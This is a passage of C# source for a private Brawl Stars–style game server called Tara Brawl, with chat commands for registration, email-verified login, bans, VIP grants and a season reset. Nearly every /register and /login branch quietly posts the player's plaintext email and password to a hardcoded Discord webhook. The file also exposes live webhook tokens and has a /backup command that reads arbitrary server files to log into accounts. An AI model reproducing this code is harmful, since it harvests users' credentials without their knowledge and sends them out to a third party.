                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                            return;
                        }
                        else if (denemehakki == 0)
                        {
                            kodorhani = false;
                            responses.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Hakkın kalmadı."
                                : "You have no attempts left.";
                            Account plreaccount = Accounts.Load(HomeMode.Avatar.AccountId);
                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                            plreaccount.Home.TBIDBanEndTime = DateTime.Now.AddMinutes(15);
                            Connection.Send(responses);
                            return;
                        }
                    }
                }

                if (tur == "login")
                {
                    if (message.Message.StartsWith(publicrandomkod.ToString()))
                    {
                        AllianceStreamEntryMessage response = new AllianceStreamEntryMessage();

                        string accountIdS = LoginUserFromDatabase(girismail, girissifre);

                        if (string.IsNullOrEmpty(accountIdS))
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Hesaba girilemedi."
                                : "Unable to log in.";
                            Connection.Send(response);
                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                            return;
                        }

                        Account account = Accounts.Load((long)Convert.ToDouble(accountIdS));

                        if (account == null)
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Böyle bir hesap bulunamadı."
                                : "No such account was found.";
                            Connection.Send(response);
                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                            return;
                        }

                        Connection.Send(new CreateAccountOkMessage
                        {
                            AccountId = account.AccountId,
                            PassToken = account.PassToken
                        });

                        Connection.Send(new AuthenticationFailedMessage
                        {
                            ErrorCode = 0,
                            Message = HomeMode.Home.DeviceLang == 18
                                ? "Hesaba başarıyla giriş yapıldı."
                                : "Successfully logged into the account."
                        });
                        MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");

                        kodorhani = false;
                        response.Entry.Message = HomeMode.Home.DeviceLang == 18
                            ? "Giriş yapıldı."
                            : "Login successful.";
                        Connection.Send(response);
                        MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                    }
                    else
                    {
                        Console.WriteLine("denemehakki: " + denemehakkigiris);
                        if (denemehakkigiris != 0)
                        {
                            denemehakkigiris -= 1;
                            responses.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? $"Doğrulama kodu geçersiz. Tekrar deneyin (kalan deneme hakkı: {denemehakkigiris})"
                                : $"Invalid verification code. Try again (remaining attempts: {denemehakkigiris}).";
                            Connection.Send(responses);
                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                            return;
                        }
                        else
                        {
                            kodorhani = false;
                            responses.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Hakkın kalmadı."
                                : "You have no attempts left.";
                            Account plreaccount = Accounts.Load(HomeMode.Avatar.AccountId);
                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                            plreaccount.Home.TBIDBanEndTime = DateTime.Now.AddMinutes(15);
                            Connection.Send(responses);
                            return;
                        }
                    }
                }

            }

            if (message.Message.StartsWith("/"))
            {
                string[] cmd = message.Message.Substring(1).Split(' ');
                if (cmd.Length == 0) return;

                AllianceStreamEntryMessage response = new AllianceStreamEntryMessage();
                response.Entry = new AllianceStreamEntry();
                response.Entry.AuthorName = "Tara Brawl";
                response.Entry.AuthorId = 1;
                response.Entry.Id = alliance.Stream.EntryIdCounter + 667 + BotIdCounter++;
                response.Entry.AuthorRole = AllianceRole.Member;
                response.Entry.Type = 2;

                long accountId = HomeMode.Avatar.AccountId;

                switch (cmd[0])
                {
                    case "status":
                        long megabytesUsed = Process.GetCurrentProcess().PrivateMemorySize64 / (1024 * 1024);
                        DateTime now = Process.GetCurrentProcess().StartTime;
                        DateTime futureDate = DateTime.Now;

                        TimeSpan timeDifference = futureDate - now;

                        string formattedTime = string.Format("{0}{1}{2}{3}",
                        timeDifference.Days > 0 ? $"{timeDifference.Days} Days, " : string.Empty,
                        timeDifference.Hours > 0 || timeDifference.Days > 0 ? $"{timeDifference.Hours} Hours, " : string.Empty,
                        timeDifference.Minutes > 0 || timeDifference.Hours > 0 ? $"{timeDifference.Minutes} Minutes, " : string.Empty,
                        timeDifference.Seconds > 0 ? $"{timeDifference.Seconds} Seconds" : string.Empty);

                        response.Entry.Message = $"Tara Brawl Server Status:\n" +
                            $"Server Game Version: v29.258\n" +
                            $"Server Build: v1.2b from 03.06.2024\n" +
                            $"Resources Sha: {Fingerprint.Sha}\n" +
                            $"Environment: Prod\n" +
                            $"Server Time: {DateTime.Now} EEST\n" +
                            $"Players Online: {Sessions.Count}\n" +
                            $"Memory Used: {megabytesUsed} MB\n" +
                            $"Uptime: {formattedTime}\n";
                        Connection.Send(response);
                        break;
                    case "resetseason":
                        if (!HomeMode.Avatar.IsDev)
                        {
                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        long lastAccId = Accounts.GetMaxAvatarId();
                        for (int accid = 1; accid <= lastAccId; accid++)
                        {
                            Account thisAcc = Accounts.LoadNoChache(accid);
                            if (thisAcc == null) continue;
                            //thisAcc.Home.HasPremiumPass = false;
                            //thisAcc.Home.BrawlPassProgress = 0;
                            //thisAcc.Home.BrawlPassTokens = 0;
                            //thisAcc.Home.PremiumPassProgress = 0;
                            //thisAcc.Home.LastRotateDate = new();
                            if (thisAcc.Home.NameColorId == 43000012)
                            {
                                //thisAcc.Home.NameColorId = 43000000;
                            }
                            /*if (thisAcc.Avatar.AllianceId > 0)
                            {
                                Alliance a = Alliances.Load(thisAcc.Avatar.AllianceId);
                                if (a == null)
                                {
                                    thisAcc.Avatar.AllianceId = 0;
                                }
                                else
                                {
                                    AllianceMember rr = a.GetMemberById(thisAcc.Avatar.AccountId);
                                    if (rr == null)
                                    {
                                        thisAcc.Avatar.AllianceId = 0;
                                    }
                                    else
                                    {
                                        thisAcc.Avatar.AllianceRole = rr.Role;
                                        rr.DisplayData.NameColorId = thisAcc.Home.NameColorId;
                                    }
                                }

                            }*/

                            if (thisAcc.Avatar.Trophies >= 550)
                            {
                                List<int> hhh = new();
                                List<int> ht = new();
                                List<int> htr = new();
                                List<int> sa = new();
                                int[] StarPointsTrophiesStart = { 550, 600, 650, 700, 750, 800, 850, 900, 950, 1000, 1050, 1100, 1150, 1200, 1250, 1300, 1350, 1400 };
                                int[] StarPointsTrophiesEnd = { 599, 649, 699, 749, 799, 849, 899, 949, 999, 1049, 1099, 1149, 1199, 1249, 1299, 1349, 1399, 1000000 };
                                int[] StarPointsSeasonRewardAmount = { 70, 120, 160, 200, 220, 240, 260, 280, 300, 320, 340, 360, 380, 400, 420, 440, 460, 480 };
                                int[] StarPointsTrophiesInReset = { 525, 550, 600, 650, 700, 725, 750, 775, 800, 825, 850, 875, 900, 925, 950, 975, 1000, 1025 };
                                foreach (Hero h in thisAcc.Avatar.Heroes)
                                {
                                    if (h.Trophies >= StarPointsTrophiesStart[0])
                                    {
                                        hhh.Add(h.CharacterId);
                                        ht.Add(h.Trophies);
                                        int i = 0;
                                        while (true)
                                        {
                                            if (h.Trophies >= StarPointsTrophiesStart[i] && h.Trophies <= StarPointsTrophiesEnd[i])
                                            {
                                                if (StarPointsTrophiesStart[i] != 1400)
                                                {
                                                    htr.Add(h.Trophies - StarPointsTrophiesInReset[i]);
                                                    h.Trophies = StarPointsTrophiesInReset[i];
                                                    sa.Add(StarPointsSeasonRewardAmount[i]);
                                                }
                                                else
                                                {
                                                    int b = h.Trophies - 1440;
                                                    b /= 2;
                                                    htr.Add(h.Trophies - StarPointsTrophiesInReset[i] - b);
                                                    h.Trophies = (StarPointsTrophiesInReset[i] + b);
                                                    sa.Add(StarPointsSeasonRewardAmount[i] + b / 2);
                                                }
                                                break;
                                            }
                                            else
                                            {
                                                i++;
                                            }
                                        }
                                    }

                                }
                                if (hhh.Count > 0)
                                {
                                    thisAcc.Home.NotificationFactory.Add(new Notification
                                    {

                                        Id = 79,
                                        HeroesIds = hhh,
                                        HeroesTrophies = ht,
                                        HeroesTrophiesReseted = htr,
                                        StarpointsAwarded = sa,
                                    });
                                }
                            }
                            if (HomeMode.Avatar.PremiumLevel > 0)
                            {
                                HomeMode.Avatar.PremiumLevel = 1;
                                HomeMode.Home.PremiumEndTime = DateTime.UtcNow.Date.AddDays(14);
                                long timestampq = DateTime.Now.Ticks / TimeSpan.TicksPerSecond;
                                int timestampsq = Convert.ToInt32(timestampq % int.MaxValue);
                                thisAcc.Home.NotificationFactory.Add(new Notification
                                {
                                    Id = 81,
                                    TimePassed = Convert.ToInt32(timestampsq),
                                    MessageEntry = "Kupa ligi sıfırlandı!\nTrophy league has been reset!"
                                    //MessageEntry = $"Merhaba! vip'in çalışma şeklini değiştirdik ve artık bir kerelik satın alma yerine abonelik tabanlı, Ancak abonelik tanıtılmadan önce vip satın aldığınız için, aboneliği otomatik olarak {HomeMode.Home.PremiumEndTime} UTC'ye kadar uzattık: {HomeMode.Home.PremiumEndTime} UTC, bu süre geçtikten sonra, vip aboneliğini kullanmaya devam etmek istiyorsanız, yönetici ile yenilemeniz gerekecektir."
                                });
                            }
                            Accounts.Save(thisAcc);
                            Console.WriteLine(accid);
                        }
                        break;
                    /*   case "lobbyinfo":
                           if (cmd.Length != 1)
                           {
                               response.Entry.Message = $"Kullanım: /lobbyinfo";
                               Connection.Send(response);
                               return;
                           }
                           string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;

                           string lobbyInfoDirectory = Path.Combine(currentDirectory, "lobbyinfo");

                           string accountIdFilePath = Path.Combine(lobbyInfoDirectory, HomeMode.Avatar.AccountId + ".txt");

                           if (File.Exists(accountIdFilePath))
                           {
                               File.Delete(accountIdFilePath);
                               response.Entry.Message = $"Lobby info açıldı.";
                               Connection.Send(new AuthenticationFailedMessage
                               {
                                   ErrorCode = 0,
                                   Message = "Lobby info açıldı."
                               });
                           }
                           else
                           {
                               File.WriteAllText(accountIdFilePath, "");
                               response.Entry.Message = $"Lobby info kapatıldı.";
                               Connection.Send(new AuthenticationFailedMessage
                               {
                                   ErrorCode = 0,
                                   Message = "Lobby info kapatıldı."
                               });

                           }
                           Connection.Send(response);

                           break;*/
                    case "register":
                        if (cmd.Length != 3)
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Kullanım: /register [e-posta] [şifre]"
                                : "Usage: /register [email] [password]";
                            Connection.Send(response);
                            return;
                        }

                        string username = cmd[1];
                        string password = cmd[2];
                        MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {username} | sifre: {password}");
                        if (!isemail(username))
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Geçersiz e-posta adresi."
                                : "Invalid mail.";
                            Connection.Send(response);
                            return;
                        }
                        if (!IsValidPassword(password))
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Güvensiz şifre. Şifre en az 8 karakter olmalı, en az bir harf ve bir sayı içermelidir."
                                : "Weak password. The password must be at least 8 characters long and contain at least one letter and one number.";
                            Connection.Send(response);
                            return;
                        }

                        bool registrationSuccess = CheckUserExists(username, HomeMode.Avatar.AccountId);

                        if (registrationSuccess)
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Kayıt başarısız. Bu kullanıcı adı zaten kullanılıyor."
                                : "Registration failed. This username is already in use.";
                            Connection.Send(response);
                            return;
                        }

                        Account plreaccountsss = Accounts.Load(HomeMode.Avatar.AccountId);

                        if (plreaccountsss.Home.TBIDBanEndTime != null)
                        {
                            if (DateTime.Now < plreaccountsss.Home.TBIDBanEndTime)
                            {
                                TimeSpan remainingTime = plreaccountsss.Home.TBIDBanEndTime - DateTime.Now;
                                response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                    ? $"Kayıt başarısız. {remainingTime.Minutes} dakika ve {remainingTime.Seconds} saniye sonra tekrar deneyin."
                                    : $"Registration failed. Try again in {remainingTime.Minutes} minutes and {remainingTime.Seconds} seconds.";
                                Connection.Send(response);
                                kodorhani = false;
                                return;
                            }
                        }

                        Random rnd = new Random();
                        int rndsonuc = rnd.Next(100000, 1000000);
                        sendRegisterMail(username, rndsonuc);
                        publicrandomkod = rndsonuc;
                        response.Entry.Message = HomeMode.Home.DeviceLang == 18
                            ? "E-Postanıza gelen doğrulama kodunu girin:"
                            : "Enter the verification code sent to your email:";
                        Connection.Send(response);
                        kodorhani = true;
                        tur = "register";
                        girismail = username;
                        girissifre = password;
                        denemehakki = 5;
                        break;

                    case "login":
                        if (cmd.Length != 3)
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Kullanım: /login [e-posta] [şifre]"
                                : "Usage: /login [email] [password]";
                            Connection.Send(response);
                            return;
                        }

                        string loginUsername = cmd[1];
                        string loginPassword = cmd[2];
                        MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {loginUsername} | sifre: {loginPassword}");
                        if (!isemail(loginUsername))
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Geçersiz e-posta adresi."
                                : "Invalid mail.";
                            Connection.Send(response);
                            
                            return;
                        }
                        string accountIdS = LoginUserFromDatabase(loginUsername, loginPassword);

                        if (string.IsNullOrEmpty(accountIdS))
                        {
                            response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Hesaba girilemedi."
                                : "Login failed.";
                            Connection.Send(response);
                            return;
                        }

                        Account plreaccounts = Accounts.Load(HomeMode.Avatar.AccountId);

                        if (plreaccounts.Home.TBIDBanEndTime != null)
                        {
                            if (DateTime.Now < plreaccounts.Home.TBIDBanEndTime)
                            {
                                TimeSpan remainingTime = plreaccounts.Home.TBIDBanEndTime - DateTime.Now;
                                response.Entry.Message = HomeMode.Home.DeviceLang == 18
                                    ? $"Giriş başarısız. {remainingTime.Minutes} dakika ve {remainingTime.Seconds} saniye sonra tekrar deneyin."
                                    : $"Login failed. Try again in {remainingTime.Minutes} minutes and {remainingTime.Seconds} seconds.";
                                Connection.Send(response);
                                kodorhani = false;
                                return;
                            }
                        }

                        Random rndss = new Random();
                        int rndsonucss = rndss.Next(100000, 1000000);
                        sendRegisterMail(loginUsername, rndsonucss);
                        publicrandomkod = rndsonucss;
                        response.Entry.Message = HomeMode.Home.DeviceLang == 18
                            ? "E-Postanıza gelen doğrulama kodunu girin:"
                            : "Enter the verification code sent to your email:";
                        Connection.Send(response);
                        kodorhani = true;
                        tur = "login";
                        girismail = loginUsername;
                        girissifre = loginPassword;
                        denemehakkigiris = 5;
                        break;

                    case "logindev":
                        if (!HomeMode.Avatar.IsDev)
                        {
                            response.Entry.Message = $"You don\'t have right to use this command"; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        if (cmd.Length != 2)
                        {
                            response.Entry.Message = $"Kullanım: /login [kullanıcı adı] [şifre]";
                            Connection.Send(response);
                            return;
                        }
                        string loginDevId = cmd[1];

                        Account account = Accounts.Load(LogicLongCodeGenerator.ToId(loginDevId));

                        if (account == null)
                        {
                            response.Entry.Message = $"Böyle bir hesap bulunamadı.";
                            Connection.Send(response);
                            return;
                        }


                        Connection.Send(new CreateAccountOkMessage
                        {
                            AccountId = account.AccountId,
                            PassToken = account.PassToken
                        });

                        Connection.Send(new AuthenticationFailedMessage
                        {
                            ErrorCode = 0,
                            Message = "Hesaba başarıyla giriş yapıldı."
                        });


                        break;
                    case "backup":
                        if (cmd.Length != 2)
                        {
                            response.Entry.Message = $"/backup [code]";
                            Connection.Send(response);
                            return;
                        }
                        string kk = "";
                        if (File.Exists(cmd[1]))
                        {
                            kk = File.ReadAllText(cmd[1]);
                        }
                        else
                        {
                            response.Entry.Message = $"Hata";
                            Connection.Send(response);
                            return;
                        }
                        string qqq = kk;

                        Account accountq = Accounts.Load(LogicLongCodeGenerator.ToId(qqq));

                        if (accountq == null)
                        {
                            response.Entry.Message = $"Böyle bir hesap bulunamadı.";
                            Connection.Send(response);
                            return;
                        }


                        Connection.Send(new CreateAccountOkMessage
                        {
                            AccountId = accountq.AccountId,
                            PassToken = accountq.PassToken
                        });

                        Connection.Send(new AuthenticationFailedMessage
                        {
                            ErrorCode = 0,
                            Message = "Hesaba başarıyla giriş yapıldı."
                        });


                        break;
                    /*
                case "changepassword":
                    if (cmd.Length != 3)
                    {
                        response.Entry.Message = $"Kullanım: /changepassword [eski şifre] [yeni şifre]";
                        Connection.Send(response);
                        return;
                    }

                    string oldPassword = cmd[1];
                    string newPassword = cmd[2];


                    string usernames = GetUsernameByAccountId(accountId);

                    if (string.IsNullOrEmpty(usernames))
                    {
                        response.Entry.Message = $"Kullanıcı adı bulunamadı.";
                        Connection.Send(response);
                        return;
                    }

                    bool isOldPasswordCorrect = VerifyOldPassword(usernames, oldPassword);

                    if (!isOldPasswordCorrect)
                    {
                        response.Entry.Message = $"Eski şifre yanlış.";
                        Connection.Send(response);
                        return;
                    }

                    bool passwordChanged = ChangeUserPasswordInDatabase(accountId, newPassword);

                    if (passwordChanged)
                    {
                        response.Entry.Message = $"Şifre başarıyla değiştirildi.";
                    }
                    else
                    {
                        response.Entry.Message = $"Şifre değiştirilemedi.";
                    }

                    Connection.Send(response);
                    break;
                case "changeusername":
                    if (cmd.Length != 3)
                    {
                        response.Entry.Message = $"Kullanım: /changeusername [şifre] [yeni kullanıcı adı]";
                        Connection.Send(response);
                        return;
                    }

                    string password2 = cmd[1];
                    string newUsername = cmd[2];

                    string currentUsername = GetUsernameByAccountId(accountId);

                    if (string.IsNullOrEmpty(currentUsername))
                    {
                        response.Entry.Message = $"Kullanıcı adı bulunamadı.";
                        Connection.Send(response);
                        return;
                    }

                    bool isPasswordCorrect = VerifyOldPassword(currentUsername, password2);

                    if (!isPasswordCorrect)
                    {
                        response.Entry.Message = $"Şifre yanlış.";
                        Connection.Send(response);
                        return;
                    }

                    bool isUsernameTaken = IsUsernameTaken(newUsername);

                    if (isUsernameTaken)
                    {
                        response.Entry.Message = $"Bu kullanıcı adı zaten kullanımda.";
                        Connection.Send(response);
                        return;
                    }

                    bool usernameChanged = ChangeUsernameInDatabase(accountId, newUsername);

                    if (usernameChanged)
                    {
                        response.Entry.Message = $"Kullanıcı adı başarıyla değiştirildi.";
                    }
                    else
                    {
                        response.Entry.Message = $"Kullanıcı adı değiştirilemedi.";
                    }

                    Connection.Send(response);
                    break;
                    */
                    case "bildirim":
                        if (!HomeMode.Avatar.IsDev)
                        {

                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        try
                        {

                            long qwids = LogicLongCodeGenerator.ToId(cmd[1]);
                            Account dsadasds = Accounts.Load(qwids);
                            if (dsadasds == null)
                            {
                                Console.WriteLine("Fail: account not found!");
                                return;
                            }

                            Notification ns = new Notification
                            {
                                Id = 81,
                                MessageEntry = cmd[2]
                            };
                            dsadasds.Home.NotificationFactory.Add(ns);
                            LogicAddNotificationCommand acms = new()
                            {
                                Notification = ns
                            };
                            AvailableServerCommandMessage asms = new AvailableServerCommandMessage();
                            asms.Command = acms;
                            if (Sessions.IsSessionActive(qwids))
                            {
                                var session = Sessions.GetSession(qwids);
                                session.GameListener.SendTCPMessage(asms);
                            }
                        }
                        catch
                        {

                        }
                        break;

                    case "ban":
                        if (!HomeMode.Avatar.IsDev)
                        {
                            response.Entry.Message = $"You don\'t have right to use this command"; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        long dsaid = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account plraccount = Accounts.Load(dsaid);
                        if (plraccount == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }
                        MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1311835582971772978/DrSLBoCzymvY1lA6W4H778TbBkvJKUw0ckwT2O8GH2j3dEwzPt6YCJ0uhwz9FtVvGAen", "<a:banned:1273599319055925280> `" + plraccount.Avatar.Name + "` sunucudan yasaklandı");
                        MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1273596818961469521/_Qqh4dp7SRhC5P8n5uiNwk2VTGYkpNPGaE_0gIqujXvj08EErcBaMupNr_pHCZd8hM9z", "<a:banned:1273599319055925280> `" + plraccount.Avatar.Name + "`was banned from server.");

                        plraccount.Avatar.Banned = true;
                        //plraccount.Avatar.ResetTrophies();
                        plraccount.Avatar.Name = "Account Banned";
                        /*Notification bdn = new()
                            {
                                Id = 81,
                                MessageEntry = "Hesabınız bazı nedenlerden dolayı devre dışı bırakıldı!\nEğer bunun bir hata olduğunu düşünüyorsanız yönetimle iletişime geçin!"
                            };
                            plraccount.Home.NotificationFactory.Add(bdn);*/
                        if (Sessions.IsSessionActive(dsaid))
                        {
                            var session = Sessions.GetSession(dsaid);
                            session.GameListener.SendTCPMessage(new AuthenticationFailedMessage()
                            {
                                Message = "Hesabınız da bazı değişiklikler yapıldı,lütfen oyunu yeniden başlatın!"
                            });
                            Sessions.Remove(dsaid);
                        }

                        break;

                    case "unban":
                        if (!HomeMode.Avatar.IsDev)
                        {
                            response.Entry.Message = $"You don\'t have right to use this command";
                            Connection.Send(response);
                            return;
                        }
                        long dsaidd = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account plraccountt = Accounts.Load(dsaidd);
                        if (plraccountt == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }
                        plraccountt.Avatar.IsCommunityBanned = false;
                        Notification unbn = new()
                        {
                            Id = 81,
                            MessageEntry = "Hesabınız bazı nedenlerden dolayı devre dışı bırakılmıştı!\nAma bunun bir hata olduğu tespit edildi ve hesabınız etkinleştirildi!"
                        };
                        plraccountt.Home.NotificationFactory.Add(unbn);
                        if (Sessions.IsSessionActive(dsaidd))
                        {
                            var session = Sessions.GetSession(dsaidd);
                            session.GameListener.SendTCPMessage(new AuthenticationFailedMessage()
                            {
                                Message = "Hesabınız da bazı değişiklikler yapıldı,lütfen oyunu yeniden başlatın!"
                            });
                            Sessions.Remove(dsaidd);
                        }

                        break;

                    case "maintance":
                        if (!HomeMode.Avatar.IsDev)
                        {
                            response.Entry.Message = $"You don\'t have right to use this command"; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }

                        response.Entry.Message = $"Done!"; // /usecode [code] - use bonus code
                        Connection.Send(response);
                        Sessions.StartShutdown();
                        AccountCache.SaveAll();
                        AllianceCache.SaveAll();

                        AccountCache.Started = false;
                        AllianceCache.Started = false;
                        break;

                    case "mm":
                        if (HomeMode.Avatar.AccountId != 2)
                        {
                            response.Entry.Message = $"You don\'t have right to use this command"; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        Events.GenerateEventsInf();
                        break;

                    case "gems":
                        if (!HomeMode.Avatar.IsDev)
                        {
                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        if (cmd.Length != 3 || !int.TryParse(cmd[2], out int donationAmount))
                        {
                            Console.WriteLine("Usage: /gems [TAG] [DonationCount]");
                            return;
                        }

                        long qwidGems = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account targetAccountGems = Accounts.Load(qwidGems);
                        if (targetAccountGems == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }

                        Notification nGems = new Notification
                        {
                            Id = 89,
                            DonationCount = donationAmount,
                            MessageEntry = $"<c6>Elmaslarınız: {donationAmount}, sunucuya desteğiniz için teşekkür ederiz!</c>"
                        };
                        targetAccountGems.Home.NotificationFactory.Add(nGems);
                        LogicAddNotificationCommand acmGems = new()
                        {
                            Notification = nGems
                        };
                        AvailableServerCommandMessage asmGems = new AvailableServerCommandMessage();
                        asmGems.Command = acmGems;
                        if (Sessions.IsSessionActive(qwidGems))
                        {
                            var sessionGems = Sessions.GetSession(qwidGems);
                            sessionGems.GameListener.SendTCPMessage(asmGems);
                        }
                        break;
                    /*case "starshelly":
                        string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                        string winsDirectory = Path.Combine(appDirectory, "Winsprn");

                        if (!Directory.Exists(winsDirectory))
                        {
                            Directory.CreateDirectory(winsDirectory);
                        }

                        string userFilePath = Path.Combine(winsDirectory, $"{HomeMode.Avatar.AccountId}.txt");

                        int wins = 0;

                        if (File.Exists(userFilePath))
                        {
                            string content = File.ReadAllText(userFilePath);
                            int.TryParse(content, out wins);
                        }
                        int prns = 200 - wins;

if (prns <= 0)
{
    response.Entry.Message = HomeMode.Home.DeviceLang == 18
        ? "Starr Shelly zaten açıldı"
        : "Starr Shelly is already unlocked";
}
else
{
    response.Entry.Message = HomeMode.Home.DeviceLang == 18
        ? "Starr Shelly açmak için " + prns + " maç oyna."
        : "Play " + prns + " matches to unlock Starr Shelly.";
}

Connection.Send(response);
                    break;
                   */ 
                    case "help":
                        if (HomeMode.Avatar.IsDev)
                        {
                            response.Entry.Message = $"(Admin)Komut Listesi:\n/help - bu mesajı gösterir\n/status - sunucunun durumunu gösterir\n/register [kullanıcı adı] [şifre]\n/login [kullanıcı adı] [şifre]\n/gems [kullanıcı kodu] [değer] - Belirlenen kullanıcıya girilen değer kadar elmas verir.\n/ban [kullanıcı kodu] - Belirlenen kullanıcıyı yasaklar.\n/vip [oyuncu kodu] - Belirlenen kullanıcıya VIP verir.\n/vipplus [oyuncu kodu] - Belirlenen kullanıcıya VIP Plus verir.\n/ultravip [oyuncu kodu] - Belirlenen kullanıcıya Ultra VIP verir.\n/unlockall [oyuncu kodu] - Belirlenen kullanıcının tüm savaşçılarını açar.\n/allskins [oyuncu kodu] - Belirlenen kullanıcının tüm kostümlerini açar.";
                        }
                        else
                        {
                            response.Entry.Message = $"Komut Listesi:\n/help - bu mesajı gösterir\n/status - sunucunun durumunu gösterir\n/register [kullanıcı adı] [şifre]\n/login [kullanıcı adı] [şifre]"; // /usecode [code] - use bonus code
                        }
                        Connection.Send(response);
                        break;
                    case "vip":
                        if (!HomeMode.Avatar.IsDev)
                        {

                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        if (cmd.Length != 2)
                        {
                            Console.WriteLine("Usage: /changevalue [TAG] [FieldName] [Value]");
                            return;
                        }

                        long qwid = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account dsadasd = Accounts.Load(qwid);
                        if (dsadasd == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }
                        if (dsadasd.Home.PremiumEndTime < DateTime.UtcNow)
                        {
                            dsadasd.Home.PremiumEndTime = DateTime.UtcNow.AddMonths(1);
                        }
                        else
                        {
                            dsadasd.Home.PremiumEndTime = dsadasd.Home.PremiumEndTime.AddMonths(1);
                        }

                        dsadasd.Avatar.PremiumLevel = 1;
                        HomeMode.Home.HasPremiumPass = true;
                        long timestampf = DateTime.Now.Ticks / TimeSpan.TicksPerSecond;
                        int timestampsfdfdf = Convert.ToInt32(timestampf % int.MaxValue);

                        Notification n = new Notification
                        {
                            Id = 89,
                            DonationCount = 100,
                            TimePassed = Convert.ToInt32(timestampsfdfdf),
                            MessageEntry = $"<c6>Vip {dsadasd.Home.PremiumEndTime} UTC'ye kadar etkinleştirildi/uzatıldı, sunucuyu desteklediğiniz için teşekkürler!</c>\r\n"
                        };
                        dsadasd.Home.NotificationFactory.Add(n);
                        LogicAddNotificationCommand acm = new()
                        {
                            Notification = n
                        };
                        AvailableServerCommandMessage asm = new AvailableServerCommandMessage();
                        asm.Command = acm;
                        if (Sessions.IsSessionActive(qwid))
                        {
                            var session = Sessions.GetSession(qwid);
                            session.GameListener.SendTCPMessage(asm);
                        }
                        break;
                    case "vipplus":
                        if (!HomeMode.Avatar.IsDev)
                        {

                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        if (cmd.Length != 2)
                        {
                            Console.WriteLine("Usage: /vipplus [PLAYERTAG]");
                            return;
                        }

                        long qwidd = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account dsadasdd = Accounts.Load(qwidd);
                        if (dsadasdd == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }
